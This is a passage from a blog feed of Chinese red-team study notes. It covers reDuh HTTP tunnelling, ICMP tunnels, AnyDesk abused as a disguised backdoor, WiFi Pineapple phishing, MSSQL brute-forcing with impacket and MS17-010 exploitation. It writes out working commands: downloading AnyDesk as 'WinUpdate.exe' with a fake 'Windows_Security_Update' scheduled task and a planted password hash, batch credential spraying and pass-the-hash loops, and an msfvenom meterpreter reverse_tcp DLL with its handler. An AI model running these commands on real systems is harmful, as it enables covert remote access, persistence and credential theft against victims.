https://github.com/sensepost/reDuh.git</span>Cloning into <span class="hljs-string">&#x27;reDuh&#x27;</span>...<span class="hljs-symbol">remote:</span> Enumerating <span class="hljs-symbol">objects:</span> <span class="hljs-number">47</span>, done.<span class="hljs-symbol">remote:</span> Total <span class="hljs-number">47</span> (delta 0), reused 0 (delta 0), pack‐reused <span class="hljs-number">47</span>Unpacking <span class="hljs-symbol">objects:</span> <span class="hljs-number">100</span>% (<span class="hljs-number">47/47</span>), done.root<span class="hljs-variable">@John</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cd reDuh/</span>root<span class="hljs-variable">@John</span><span class="hljs-symbol">:~/reDuh</span><span class="hljs-comment"># ls</span>README.markdown reDuhClient reDuhServers</code></pre><p><strong>靶机执行：</strong></p><p>以aspx为demo</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/11.png" alt="demo"><br><strong>攻击机执行：</strong></p><p>绑定端口：</p><pre><code class="hljs bash">$ java -jar reDuhClient.jar http://192.168.126.170:8031/reDuh.aspx host:3389[Info]Using Proxy: host:3389[Info]Querying remote web page <span class="hljs-keyword">for</span> usable remote service port[Info]Remote RPC port chosen as 42000[Info]Attempting to start reDuh from 192.168.126.170:8031/reDuh.aspx.  Using service port 42000. Please <span class="hljs-built_in">wait</span>...[Info]*********************************************************[Info]***                 Using proxy                       ***[Info]*********************************************************[Info]*** We<span class="hljs-string">&#x27;ll not know whether reDuh started successfully ***</span><span class="hljs-string">[Info]*** Starting ReDuh now and lets hope for the best...  ***</span><span class="hljs-string">[Info]*********************************************************</span><span class="hljs-string">[Info]reDuhClient service listener started on local port 1010</span></code></pre><p>开启新terminal，建立隧道</p><p><strong>命令如下：</strong></p><pre><code class="hljs css"><span class="hljs-selector-tag">telnet</span> 127.0.0.1 1010然后执行<span class="hljs-selector-attr">[createTunnel]</span>1234<span class="hljs-selector-pseudo">:127.0.0.1</span><span class="hljs-selector-pseudo">:3389</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/13.png" alt="执行"></p><p>访问本地1234端口，既等价于访问靶机3389端口</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/14.png" alt="连接"><br>遗憾的是reDuh年代久远，使用繁琐，并官方已停止维护。但是它奠定了HTTP隧道</p><ul><li><a href="https://micro8.gitbook.io/micro8/contents-1/91-100/100http-sui-dao-reduh-di-si-ji">https://micro8.gitbook.io/micro8/contents-1/91-100/100http-sui-dao-reduh-di-si-ji</a></li></ul><hr><h2 id="5、基于-Ptunnel-建立ICMP隧道（没复现）"><a href="#5、基于-Ptunnel-建立ICMP隧道（没复现）" class="headerlink" title="5、基于 Ptunnel 建立ICMP隧道（没复现）"></a>5、基于 Ptunnel 建立ICMP隧道（没复现）</h2><p><strong>前言</strong></p><p>在某些渗透测试环境下，获得了一个主机的权限但是该主机没有访问外网的权限，对于这种较为严格的网络环境，第一时间想到的就是隧道技术。常见的隧道技术有SSH\DNS\ICMP\端口转发等，大多数端口都存在被禁用的可能，但是ICMP作为基础服务被禁用的可能性却极小，在常用协议都被禁用的情况下可以考虑使用ICMP隧道。</p><p><strong>网络拓扑</strong></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/15.png" alt="网络拓扑"><br>内网主机10.10.10.0/24除了ICMP通讯不能主动访问外网任何资源，20.20.20.101为hack的ICMP隧道服务端</p><p><strong>可以参考</strong></p><ul><li><a href="https://www.bilibili.com/video/BV1s54y1X7i4">https://www.bilibili.com/video/BV1s54y1X7i4</a></li></ul><hr><h2 id="6、使用anydesk做远控（没复现）"><a href="#6、使用anydesk做远控（没复现）" class="headerlink" title="6、使用anydesk做远控（没复现）"></a>6、使用anydesk做远控（没复现）</h2><p>anydesk是类似teamviewer的远程管理软件，但是他不用安装且体积小</p><p><strong>场景举例</strong></p><p>1）有云锁，护卫神等禁止3389登录时<br>2）类似阿里云这种，登录3389会报警<br>3）连接内网中可以出网的windows机器</p><p><strong>注意事项</strong></p><p>1）启动anydesk的权限需要桌面用户权限，比如，IIS做中间件的环境中，拿到了webshell一般都是没有桌面用户权限的，如果启动anydesk不会成功</p><p>2）启动anydesk时桌面不能被注销</p><p>3）有可能连接上去是黑屏，这个是因为该桌面用户退出远程桌面但没有注销，此时，除非能用<br>winlogon启动anydesk，否则没法使用屏幕</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.zhihuifly.com<span class="hljs-regexp">/t/</span>topic/<span class="hljs-number">1121</span>https:<span class="hljs-regexp">//</span><span class="hljs-number">422926799</span>.github.io<span class="hljs-regexp">/posts/</span><span class="hljs-number">6</span>b1dcf8a.html</code></pre><p>这里是还有很骚气的方法，往后在亲自复现…</p><hr><p>复现另外的方法…</p><p><strong>AnyDesk利用</strong></p><p>AnyDesk 是一款声称速度最快的免费长途衔接/长途桌面操控软件，据说是前 TeamViewer 开发小组人员自立门户的商品，它拥有领先的视频压缩技能 DeskRT， 能够轻松穿透防火墙/路由器。 重点是不用安装，而且体积只有2,917KB。<br>镜外诈骗人员使用修改版本做为远控，发给受害人获取控制电脑权限。</p><p>本地anydesk设置自主访问密码，然后生成的配置文件放到目标中，这样只要获取ad.anynet.id即可连接。收费版支持命令行反回ad.anynet.id与设置密码。不需要像免费版这么复杂。</p><p><strong>使用场景</strong></p><pre><code class="hljs armasm">云锁，护卫神等禁止<span class="hljs-number">3389</span>登录绕过；阿里云登录<span class="hljs-number">3389</span>则会<span class="hljs-built_in">IP</span>报警提示绕过；内网穿透机器、传输文件等；白名单软件过全世界所有杀软、流量加密；<span class="hljs-symbol">BlackRouter</span>勒索软件通过AnyDesk捆绑进行传播；</code></pre><p><strong>支持操作系统</strong></p><pre><code class="hljs ebnf"><span class="hljs-attribute">Windows</span><span class="hljs-attribute">MacOS</span><span class="hljs-attribute">Android</span><span class="hljs-attribute">IOS</span><span class="hljs-attribute">Linux</span><span class="hljs-attribute">FreeBSD</span><span class="hljs-attribute">Raspberry Pi</span><span class="hljs-attribute">Chrome OS</span></code></pre><p><strong>利用条件</strong></p><pre><code class="hljs plain">桌面用户权anydesk时桌面不能被注</code></pre><p><strong>首先本机生成密码:</strong><br><img src="https://img-blog.csdnimg.cn/20200927205157982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>配置文件将会保存在：<br><img src="https://img-blog.csdnimg.cn/2020092720521626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>service.conf存放</p><pre><code class="hljs css"><span class="hljs-selector-tag">ad</span><span class="hljs-selector-class">.anynet</span><span class="hljs-selector-class">.pwd_hash</span>与<span class="hljs-selector-tag">ad</span><span class="hljs-selector-class">.anynet</span><span class="hljs-selector-class">.pwd_salt</span>提取出来。</code></pre><p>system.conf存放：</p><pre><code class="hljs css"><span class="hljs-selector-tag">ad</span><span class="hljs-selector-class">.anynet</span><span class="hljs-selector-class">.id</span></code></pre><p>Webshell中将Anydesk上传受害者机器，运行一遍Anydesk，然后kill掉</p><pre><code class="hljs awk">taskkill <span class="hljs-regexp">/F /</span>IM AnyDesk.exe</code></pre><p>在进入到</p><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\&#123;</span>username&#125;<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\R</span>oaming<span class="hljs-symbol">\A</span>nyDesk</code></pre><p>路径把以上两个配置写入到service.conf文件下</p><p>连接</p><p>命令复现</p><pre><code class="hljs css"><span class="hljs-selector-tag">powershelgl</span><span class="hljs-selector-class">.exe</span> &quot;(<span class="hljs-selector-tag">New-Object</span> <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.Net</span><span class="hljs-selector-class">.WebClient</span>)<span class="hljs-selector-class">.DownloadFile</span>(\&quot;<span class="hljs-selector-tag">https</span>://<span class="hljs-selector-tag">download</span><span class="hljs-selector-class">.anydesk</span><span class="hljs-selector-class">.com</span>/<span class="hljs-selector-tag">AnyDesk</span><span class="hljs-selector-class">.exe</span>\&quot;,\&quot;<span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">inetpub</span>\<span class="hljs-selector-tag">wwwroot</span>\<span class="hljs-selector-tag">WinUpdate</span><span class="hljs-selector-class">.exe</span>\&quot;)&quot;</code></pre><p>确定有哪些用户当前正在使用桌面：</p><pre><code class="hljs lsl">powershelgl.exe <span class="hljs-string">&quot;(((Get-WmiObject -Class Win32_Process -Filter &#x27;Name=<span class="hljs-subst">\&quot;</span>explorer.exe<span class="hljs-subst">\&quot;</span>&#x27;).GetOwner().User) -split &#x27;<span class="hljs-subst">\n</span>&#x27;)&quot;</span></code></pre><p>创建一个计划任务:</p><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/Create</span> <span class="hljs-string">/TN</span> Windows_Security_Update <span class="hljs-string">/SC</span> monthly <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;C:\inetpub\wwwroot\WinUpdate.exe&quot;</span> <span class="hljs-string">/RU</span> administrator</code></pre><p>先执行一次生成配置文件：</p><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/run /</span>tn Windows_Security_Update</code></pre><p>结束掉进程：</p><pre><code class="hljs awk">taskkill <span class="hljs-regexp">/F /</span>IM WinUpdate.exe</code></pre><p>添加密码</p><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> ad.anynet.pwd_hash=a<span class="hljs-number">7</span>f<span class="hljs-number">9</span>ef<span class="hljs-number">816567</span>ddeb<span class="hljs-number">071</span>c<span class="hljs-number">985771698</span>c<span class="hljs-number">70</span>a<span class="hljs-number">6</span>aec<span class="hljs-number">4</span>c<span class="hljs-number">70</span>dc<span class="hljs-number">284943</span>b<span class="hljs-number">3104</span>dcc<span class="hljs-number">06</span>b<span class="hljs-number">8184</span> &gt;&gt; C:\Users\administrator\AppData\Roaming\AnyDesk\service.conf<span class="hljs-attribute">echo</span> ad.anynet.pwd_salt=<span class="hljs-number">5</span>afbd<span class="hljs-number">8</span>fc<span class="hljs-number">7334032</span>ddbddd<span class="hljs-number">489363</span>e<span class="hljs-number">25</span>f<span class="hljs-number">8</span> &gt;&gt; C:\Users\administrator\AppData\Roaming\AnyDesk\service.conf</code></pre><p>利用需要一定条件，除此之外也需要考虑WebShell免杀。</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.moonsec.com<span class="hljs-regexp">/archives/</span><span class="hljs-number">1098</span>   --云渗透思路</code></pre><hr><h2 id="7、Kerberos域内委派攻击（重要了解）"><a href="#7、Kerberos域内委派攻击（重要了解）" class="headerlink" title="7、Kerberos域内委派攻击（重要了解）"></a>7、Kerberos域内委派攻击（重要了解）</h2><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7217</span>   --域渗透——Kerberos委派攻击https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7517</span>   --Kerberos之域内委派攻击https:<span class="hljs-regexp">//</span><span class="hljs-number">422926799</span>.github.io<span class="hljs-regexp">/posts/</span><span class="hljs-number">4</span>d3be28.html    --跟着先知社区复现文章https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/backlion/</span>p/<span class="hljs-number">10537813</span>.html  --老文章思路https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">166934</span>   --攻击活动目录：无约束委派及域林信任https:<span class="hljs-regexp">//</span>shenaniganslabs.io<span class="hljs-regexp">/2019/</span><span class="hljs-number">01</span><span class="hljs-regexp">/28/</span>Wagging-the-Dog.html   --最详细的介绍，有视频，但是全英文，感谢大佬</code></pre><p>认真看完，就能熟悉了…</p><hr><h2 id="8、ATT-amp-CK攻防初窥系列-执行篇"><a href="#8、ATT-amp-CK攻防初窥系列-执行篇" class="headerlink" title="8、ATT&amp;CK攻防初窥系列-执行篇"></a>8、ATT&amp;CK攻防初窥系列-执行篇</h2><pre><code class="hljs css"><span class="hljs-selector-tag">https</span>://<span class="hljs-selector-tag">zhuanlan</span><span class="hljs-selector-class">.kanxue</span><span class="hljs-selector-class">.com</span>/<span class="hljs-selector-tag">article-9787</span><span class="hljs-selector-class">.htm</span>   <span class="hljs-selector-tag">--ATT</span>&amp;<span class="hljs-selector-tag">CK</span>攻防初窥系列<span class="hljs-selector-tag">--</span>执行篇（一）<span class="hljs-selector-tag">https</span>://<span class="hljs-selector-tag">zhuanlan</span><span class="hljs-selector-class">.kanxue</span><span class="hljs-selector-class">.com</span>/<span class="hljs-selector-tag">article-10014</span><span class="hljs-selector-class">.htm</span>   <span class="hljs-selector-tag">---ATT</span>&amp;<span class="hljs-selector-tag">CK</span>攻防初窥系列<span class="hljs-selector-tag">--</span>执行篇（二）<span class="hljs-selector-tag">https</span>://<span class="hljs-selector-tag">zhuanlan</span><span class="hljs-selector-class">.kanxue</span><span class="hljs-selector-class">.com</span>/<span class="hljs-selector-tag">article-9857</span><span class="hljs-selector-class">.htm</span>   <span class="hljs-selector-tag">---ATT</span>&amp;<span class="hljs-selector-tag">CK</span>攻防初窥系列<span class="hljs-selector-tag">--</span>横向移动篇（一）</code></pre><p>感谢看雪大佬！！</p><hr><h2 id="9、Powershell"><a href="#9、Powershell" class="headerlink" title="9、Powershell"></a>9、Powershell</h2><h3 id="利用360正则不严执行-powershell上线"><a href="#利用360正则不严执行-powershell上线" class="headerlink" title="利用360正则不严执行 powershell上线"></a>利用360正则不严执行 powershell上线</h3><p>powershell无文件利用自blackhat演讲至今已经过去近5年,将来的日子会越来越不好过，windows的审计会越来越细，以后将是.NET的天下。从CS推荐使用.NET内存加载开始就已经慢慢变成红队的主流（execute-assembly）</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7903</span>   --感谢大佬的思路和技术，<span class="hljs-number">6</span>月份最新的复现https:<span class="hljs-regexp">//</span>www.chabug.org<span class="hljs-regexp">/web/</span><span class="hljs-number">1324</span>.html   --感谢s1ye大佬</code></pre><p>书中还有更好的思路，找时间按照书里的复现写出来…</p><hr><h3 id="关于-Powershell抗安全软件"><a href="#关于-Powershell抗安全软件" class="headerlink" title="关于 Powershell抗安全软件"></a>关于 Powershell抗安全软件</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.kanxue.com/book-<span class="hljs-number">38</span>-<span class="hljs-number">473</span>.htm   --看雪高级渗透课堂！https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">36250656</span>   --原文</code></pre><p>参考</p><ul><li><a href="https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ff629472(v=msdn.10)?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ff629472(v=msdn.10)?redirectedfrom=MSDN</a></li><li><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></li></ul><hr><h3 id="Invoke-Obfuscation介绍"><a href="#Invoke-Obfuscation介绍" class="headerlink" title="Invoke-Obfuscation介绍"></a>Invoke-Obfuscation介绍</h3><ul><li><a href="https://buaq.net/go-23754.html">https://buaq.net/go-23754.html</a>   –powershell配合Invoke-Obfuscation</li><li><a href="https://www.anquanke.com/post/id/86637">https://www.anquanke.com/post/id/86637</a>    –powershell 混淆</li><li><a href="https://cloud.tencent.com/developer/article/1044940">https://cloud.tencent.com/developer/article/1044940</a>   –Powershell编码与混淆</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;三、命令与控制&quot;&gt;&lt;a href=&quot;#三、命令与控制&quot; class=&quot;headerlink&quot; title=&quot;三、命令与控制&quot;&gt;&lt;/a&gt;三、命令与控制&lt;/h1&gt;&lt;h2 id=&quot;1、HTTP-隧道-ABPTTS&quot;&gt;&lt;a href=&quot;#1、HTTP-隧道-ABPTTS&quot;</summary>
      
    
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    <category term="渗透攻击红队百科全书" scheme="http://www.secice.cn/tags/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>红队攻防学习之打点进内网</title>
    <link href="http://www.secice.cn/p/28ca3946"/>
    <id>http://www.secice.cn/p/28ca3946</id>
    <published>2020-12-17T04:17:43.000Z</published>
    <updated>2020-12-17T06:08:09.582Z</updated>
    
    <content type="html"><![CDATA[<h1 id="二、打点-进入内网"><a href="#二、打点-进入内网" class="headerlink" title="二、打点-进入内网"></a>二、打点-进入内网</h1><div class="note note-primary">            <p>这一章节的内容较多，一时啃不完，部分内容粗略带过，后续有时间再单独写笔记</p>          </div><h2 id="1、外部接入点-WiFi"><a href="#1、外部接入点-WiFi" class="headerlink" title="1、外部接入点-WiFi"></a>1、外部接入点-WiFi</h2><h3 id="无线攻击实战应用之-DNSSpoof、Evil-Portal、DWall组合拳入侵（配合）"><a href="#无线攻击实战应用之-DNSSpoof、Evil-Portal、DWall组合拳入侵（配合）" class="headerlink" title="无线攻击实战应用之 DNSSpoof、Evil Portal、DWall组合拳入侵（配合）"></a>无线攻击实战应用之 DNSSpoof、Evil Portal、DWall组合拳入侵（配合）</h3><p>前言：主要向大家介绍 <code>WiFi Pineapple</code>（以下简称“菠萝”）设备的基本使用方法，以及通过菠萝中的几个模块达到中间人攻击，网站钓鱼和获得shell。文章中主要使用到<code>DWall</code>、<code>Evil Portal</code>与<code>DNSMasq Spoofv</code>三个模块</p><p>Pineapple开启与网络桥接将菠萝的按钮由off划到wifi标志，稍等片刻便会向周围发射两个无线信号。一个无线信号是菠萝的管理ap，一个是给受害者使用的开放ap。这两个ap的ssid以及管理ap的密码均可以在菠萝的web管理界面中设置</p><p><a href="http://www.wifipi.org:8080/WiFiPineapple-%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C-V1.3.pdf">http://www.wifipi.org:8080/WiFiPineapple-用户手册-V1.3.pdf</a><br><a href="https://shop.hak5.org/products/wifi-pineapple">https://shop.hak5.org/products/wifi-pineapple</a></p><p>参考该资料以及购买菠萝设备连接！</p><p>由于穷，买不起的原因，只能</p><h3 id="简单总结一下利用模块解释："><a href="#简单总结一下利用模块解释：" class="headerlink" title="简单总结一下利用模块解释："></a>简单总结一下利用模块解释：</h3><h4 id="Evil-Portal"><a href="#Evil-Portal" class="headerlink" title="Evil Portal"></a><strong>Evil Portal</strong></h4><p>可以利用Evil Portal模块获取TP-LINK管理员密码，它的作用是可以使接入用户在访问任意网站时都跳转到我们事先设置好的 Landing page中。 Landing Page是设置菠萝网关的页面，此处我们重定向到公网上一台配置好钓鱼网站的vps上，也可给菠萝添加一张sd卡，直接将钓鱼网站文件放置到菠萝中</p><h4 id="Dwall"><a href="#Dwall" class="headerlink" title="Dwall"></a><strong>Dwall</strong></h4><p>使用DWall进行中间人攻击DWall中文名称叫”绵羊墙”，是菠萝中的一个默认安装模块，它可以嗅探已连接客户端的所有HTTP请求，如URLS、Cookies、Post Data，以及实时地显示出客户端正在浏览的图片等</p><h4 id="DNSSpoof"><a href="#DNSSpoof" class="headerlink" title="DNSSpoof"></a><strong>DNSSpoof</strong></h4><p>此处使用到菠萝中的 DNSMasq spoc模块。它的作用是dns劫持，获取到受害客户端的域名解析控制权。我们可以在hosts中设置想要进行欺骗的域名，当用户输入该域名后，模块会欺骗用户将域名解析成设置好的IP，此处我们设置跳转到菠萝网关上</p><p>DNSSpoof模块可以尝试获取shell，可以尝试使受害者重定向到一台公网上的vps来下载木马文件，诱导受害者点击。木马文件可精心构造，比如具有欺骗性的文件名，免杀木马等。</p><h4 id="DNS欺骗原理"><a href="#DNS欺骗原理" class="headerlink" title="DNS欺骗原理"></a><strong>DNS欺骗原理</strong></h4><p>DNS服务器工作原理是，存储IP地址到DNS名称映射的记录（称为资源记录）数据库，联系这些资源记录与客户端，并将这些资源记录与其他DNS服务器联系。而客户端对于每个通过互联网发送的DNS请求都包含一个独特的识别码，其目的在于辨识查询和响应，并将对应的查询和响应配对在起。这就意味着，如果我们可以拦截客户端发送的DNS请求包，做一个包含该识别码的假数据包，这样目标计算机就会根据识别码认为这个假数据包就是其需要的结果，从而接受我们发送的包。这里尝试使用nslookup查看域名解析情况，用tracert命令跟踪：无修改，dns欺骗，配置静态dns，三种情况下访问测试域名的路由情况</p><h3 id="防护意见"><a href="#防护意见" class="headerlink" title="防护意见"></a>防护意见</h3><ul><li>配置静态可靠的dns </li><li>将访问的重要域名与P地址进行绑定</li><li>提高安全意识,不轻易连接不可信的、开放的无线热点</li></ul><hr><h2 id="2、应用系统漏洞利用"><a href="#2、应用系统漏洞利用" class="headerlink" title="2、应用系统漏洞利用"></a>2、应用系统漏洞利用</h2><h3 id="常见漏洞扫描"><a href="#常见漏洞扫描" class="headerlink" title="常见漏洞扫描"></a>常见漏洞扫描</h3><h4 id="Nmap扫描漏洞技巧"><a href="#Nmap扫描漏洞技巧" class="headerlink" title="Nmap扫描漏洞技巧"></a>Nmap扫描漏洞技巧</h4><ul><li>auth         处理身份验证 <ul><li>broadcast 网络广播<ul><li>brute 暴力猜解</li><li>default默认</li></ul></li><li>discovery 服务发现<ul><li>dos         拒绝服务</li><li>exploit漏洞利用</li><li>external外部扩展</li><li>fuzzer 模糊测试 </li></ul></li><li>intrusive 扫描可能造成不良后果</li><li>malware 检测后门<ul><li>safe 扫描危害较小</li><li>version 版本识别</li><li>vuln 漏洞检测 </li></ul></li></ul></li></ul><h5 id="通用参数-vuln"><a href="#通用参数-vuln" class="headerlink" title="通用参数 -vuln"></a><strong>通用参数 -vuln</strong></h5><pre><code class="hljs bash">nmap --script=vuln 192.168.1.105</code></pre><h5 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a><strong>MS17-010</strong></h5><pre><code class="hljs bash">nmap --script=smb-vuln-ms17-010 192.168.1.105</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/01.png" alt="MS17-010"></p><hr><h4 id="impacket框架之mssql服务器安全检测"><a href="#impacket框架之mssql服务器安全检测" class="headerlink" title="impacket框架之mssql服务器安全检测"></a>impacket框架之mssql服务器安全检测</h4><p>在实际渗透测试工作中经常会遇到检测项目中mssq服务器安全性,此篇文章介绍 <code>impack</code>框架中 <code>mssqlclient</code>的使用方法。</p><h5 id="mssqlclient与其他工具相比的优势"><a href="#mssqlclient与其他工具相比的优势" class="headerlink" title="mssqlclient与其他工具相比的优势"></a>mssqlclient与其他工具相比的优势</h5><ol><li>跨平台，python脚本编写，并且已有exe版本</li><li>命令行执行，速度快</li><li>支持使用 socks代理传输数据</li><li>支持以hash传递的方式进行账号验证 </li><li>支持 windows认证模式进行mssq服务的安全检测</li><li>执行sq命令可以是交互式,也可以直接回显sq命令执行结果</li></ol><h5 id="win和linux环境下使用"><a href="#win和linux环境下使用" class="headerlink" title="win和linux环境下使用"></a><strong>win和linux环境下使用</strong></h5><p>1）在windows环境下使用windows认证模式，mssqlclient测试登陆sqlserver服务器，账号验证通过后会直接返回 sql shell</p><pre><code class="hljs bash">mssqlclient.exe admin/admin123@192.168.1.105 -windows-auth</code></pre><p>2）通过 socks代理，在linux环境下使用 windows认证模式，mssqlclient测试登陆 sqlserver服务器，账号验证通过后会直接返回 sql shell</p><pre><code class="hljs bash">proxychains python mssqlclient.py sa/admin123@192.168.x.x -windows-auth</code></pre><p>3）通过 socks代理，以mssql账号验证方式测试登陆mssql服务器，账号验证成功后执行mssql. txt内的sql命令</p><pre><code class="hljs bash">proxychains python mssqlclient.py ./sa:admin123@192.168.x.x -file mssql.txt</code></pre><p>4）通过 socks代理，在linux环境下使用 windows认证模式，mssqlclient测试登录sqlserver服务器，账号验证成功后执行 command.txt内的sql命令</p><pre><code class="hljs bash">proxychains python mssqlclient.py -p 1433 admin/sa:admin123@192.168.x.x -windows-auth -file cpmmand.txt</code></pre><p>5）在windows环境下使用windows认证模式，使用ntlm hash验证方式，mssqlclient测试登陆sqlserver服务器，账号验证成功后执行command.txt内的sql命令</p><pre><code class="hljs shell">mssqlclient.exe -p 1433 -hashes :&quot;hash值&quot; admin/sqladmin@192.168.x.x -file command.txt -windows-auth</code></pre><p>同样也可以用于webshell环境下</p><h5 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a><strong>批量检测</strong></h5><p>除此之外，还可以批量检测内网 SQL server服务器的账号安全性<br>需要准备的文件有：</p><ul><li>mssqlclient.exe(必须)</li><li>command.txt(必须) </li></ul><p>以下四个文件需选其一：</p><ul><li>hashes.txt        （需验证的 ntlm hash字符串列表）<ul><li>username.txt （需验证的 username列表）<ul><li>password.txt（需验证的密码字符串列表）<ul><li>Ips.txt （需验证的p字符串列表）</li></ul></li></ul></li></ul></li></ul><p><strong>举例以下几种批量检测的bat脚本内容</strong></p><p>1）测试以 windows认证模式，使用hash传递验证，使用 mssqlclient批量测试登陆 sqlserver服务器，Ips.txt 内容为待检测sqlserver服务ip，每行一条</p><pre><code class="hljs shell">FOR /F %%i in (ips.txt) do mssqlclient.exe -p 1433 -hashes :hash值 ......</code></pre><p>2）测试以 windows认证模式，使用hash传递验证，指定主机 ntlm hash遍历验证，hashes.txt为待检测已知 ntlm hash内容，每行一条</p><pre><code class="hljs shell">FOR /F %%i in (hashes.txt) do mssqlclient.exe -p 1433 -hashes %%i domain/adminis.......</code></pre><p>3）测试以 sqlserver认证模式，指定待检测主机，遍历验证 passwords.txt 内密码有效性，passwords.txt为已知密码内容，每行一条，验证成功后执行 command.txt内sql命令</p><pre><code class="hljs shell">FOR /F %%i in (passwords.txt) do mssqlclient.exe -p 1433 ./sa:%%i@192.168.x.x ....</code></pre><p>4）测试以 sqlserver认证模式，指定待检测密码，遍历验证ip.txt内所有服务器，ip.txt为待检测sqlserver服务器，每行一条，验证成功后执行 command. txt内sql命令</p><pre><code class="hljs shell">FOR /F %%i in (ips.txt) do mssqlclient.exe -p 1433 ./sa:password123@%%1i -file ......</code></pre><p>这四种命令补全查看前面的讲解即可，或者查看参考资料</p><h5 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a><strong>参考资料：</strong></h5><ul><li><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a>    –下载</li><li><a href="https://www.puckiestyle.nl/impacket/">https://www.puckiestyle.nl/impacket/</a></li><li><a href="https://github.com/SecureAuthCorp/impacket/issues/613">https://github.com/SecureAuthCorp/impacket/issues/613</a></li></ul><hr><h4 id="MS17010py脚本利用"><a href="#MS17010py脚本利用" class="headerlink" title="MS17010py脚本利用"></a>MS17010py脚本利用</h4><h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h5><p>为什么要介绍用py脚本，因为有些机器存在漏洞，但是使用MSF的模块利用失败，而使用py脚本则能成功利用</p><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a><strong>利用</strong></h5><p>在本地用虚拟机搭建了Kail 和 Windows7系统</p><pre><code class="hljs dns">windwos7靶机IP：<span class="hljs-number">192.168.1.105</span>kali：<span class="hljs-number">192.168.1.104</span>操作机：<span class="hljs-number">192.168.1.106</span></code></pre><p><strong>Kali生成木马dll</strong></p><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.1.104 <span class="hljs-attribute">lport</span>=4444 -f dll &gt; 64.dllmsfconsole进入控制台use exploit/multi/handler <span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter/reverse_tcp<span class="hljs-builtin-name">set</span> lhost 192.168.1.104<span class="hljs-builtin-name">set</span> lport 4444run</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/02.png" 